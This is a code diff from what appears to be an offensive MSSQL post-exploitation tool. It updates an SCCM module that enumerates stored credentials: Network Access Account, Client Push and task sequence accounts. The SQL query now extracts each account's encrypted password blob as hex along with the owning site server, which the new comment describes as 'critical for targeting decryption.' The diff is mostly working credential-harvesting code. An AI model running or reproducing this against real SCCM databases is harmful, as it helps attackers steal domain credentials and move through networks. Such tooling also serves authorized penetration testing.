@@ -6,7 +6,11 @@ using System.Data;
 
 namespace MSSQLand.Actions.SCCM
 {
-    internal class SccmPasswords : BaseAction
+    /// <summary>
+    /// Enumerate SCCM stored credentials including Network Access Account (NAA), Client Push accounts, and task sequence accounts.
+    /// Shows which site server owns each account - critical for targeting decryption.
+    /// </summary>
+    internal class SccmAccounts : BaseAction
     {
         public override void ValidateArguments(string[] args)
         {
@@ -19,7 +23,7 @@ namespace MSSQLand.Actions.SCCM
 
             SccmService sccmService = new(databaseContext.QueryService, databaseContext.Server);
 
-            string[] requiredTables = { "vSMS_SC_UserAccount" };
+            string[] requiredTables = { "SC_UserAccount", "SC_SiteDefinition" };
             var databases = sccmService.GetValidatedSccmDatabases(requiredTables, 1);
 
             if (databases.Count == 0)
@@ -37,11 +41,14 @@ namespace MSSQLand.Actions.SCCM
 
                 string query = $@"
 SELECT
-    UserName,
-    Usage,
-    Password
-FROM [{db}].dbo.vSMS_SC_UserAccount
-ORDER BY UserName;
+    ua.UserName,
+    ua.Usage,
+    sd.SiteCode,
+    sd.SiteServerName,
+    CONVERT(VARCHAR(MAX), ua.Password, 1) AS Password
+FROM [{db}].dbo.SC_UserAccount ua
+LEFT JOIN [{db}].dbo.SC_SiteDefinition sd ON ua.SiteNumber = sd.SiteNumber
+ORDER BY ua.UserName;
 ";
 
                 DataTable result = databaseContext.QueryService.ExecuteTable(query);
